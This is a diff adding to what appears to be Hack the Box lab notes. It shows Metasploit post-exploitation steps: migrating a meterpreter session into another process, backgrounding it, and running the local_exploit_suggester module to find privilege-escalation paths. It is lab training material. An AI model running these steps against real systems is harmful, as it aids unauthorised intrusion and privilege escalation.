@@ -279,3 +279,14 @@ Migrate to a process
 meterpreter > migrate 1864
 ```
 ![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/362b2c35-6f96-4096-8c44-3372d3e60f01)
+
+Using Exploit Suggestor
+```
+meterpreter > {BACKGROUND SESSESION - HIT CTRL + Z}
+Background session 1? [y/N]  
+msf6 exploit(multi/handler) > use multi/recon/local_exploit_suggester
+msf6 post(multi/recon/local_exploit_suggester) > set session 1
+session => 1
+msf6 post(multi/recon/local_exploit_suggester) > run
+```
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/7f23ae4e-3606-4847-86bf-59c0581a82c6)
